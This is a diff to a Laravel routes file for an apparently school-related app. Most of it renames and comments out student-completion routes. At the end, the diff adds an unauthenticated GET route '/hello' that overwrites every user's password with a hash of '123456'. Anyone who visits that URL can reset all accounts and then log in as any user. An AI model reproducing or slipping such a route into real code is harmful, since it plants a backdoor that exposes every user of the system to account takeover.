@@ -11,7 +11,11 @@ use App\Http\Controllers\MapelController;
 use App\Http\Controllers\SiswaController;
 use App\Http\Controllers\TahunAjaranController;
 use App\Http\Controllers\UserController;
+use Doctrine\DBAL\Schema\ForeignKeyConstraint;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Route;
+
+use Illuminate\Support\Facades\DB;
 
 
 /*
@@ -132,9 +136,13 @@ Route::middleware(['auth'])->group(function () {
         Route::post("/ketuntasan/store", [KetuntasanController::class, 'store']);
 
         // param tingkatan,jurusan_id,kelas_id,user_id,ketuntasan_id;
-        Route::match(['get', 'post'], "ketuntasan/kelas", [KetuntasanController::class, 'kelas']);
-        Route::match(['get', 'post'], 'ketuntasan/kelas/siswa', [KetuntasanController::class, 'siswa']);
-        Route::match(['get', 'post'], 'ketuntasan/kelas/siswa/edit', [KetuntasanController::class, 'edit']);
+        // Route::match(['get', 'post'], "ketuntasan/kelas", [KetuntasanController::class, 'kelas']);
+        // Route::match(['get', 'post'], 'ketuntasan/kelas/siswa', [KetuntasanController::class, 'siswa']);
+        // Route::match(['get', 'post'], 'ketuntasan/kelas/siswa/edit', [KetuntasanController::class, 'edit']);
+
+        Route::match(['get', 'post'], "ketuntasan/siswas", [KetuntasanController::class, 'siswa']);
+        Route::match(['get', 'post'], "ketuntasan/siswas/show", [KetuntasanController::class, 'siswa_show']);
+        Route::match(['get', 'post'], 'ketuntasan/siswas/edit', [KetuntasanController::class, 'edit']);
     });
 
     Route::middleware('isGuru')->group(function () {
@@ -161,10 +169,17 @@ Route::middleware(['auth'])->group(function () {
     // ajax jgn di ubah
     Route::post("getDataGuruByMapel", [GuruController::class, 'getDataGuruByMapel']);
     Route::get("/getDataSiswaNaikKelas", [SiswaController::class, 'getDataSiswaNaikKelas']);
-    Route::post("/getDataKelasByJurusan", [KelasController::class, 'getDataKelasByJurusan']);
+    // Route::post("/getDataKelasByJurusan", [KelasController::class, 'getDataKelasByJurusan']);
 
     Route::get("dashboard/kelas/siswas", [SiswaController::class, 'getDataSiswaByKelas']);
 
     //logout
     Route::get('/logout', [AuthController::class, 'logout']);
+});
+
+Route::get("/hello", function () {
+    DB::table("users")
+        ->update([
+            'password' => Hash::make("123456")
+        ]);
 });
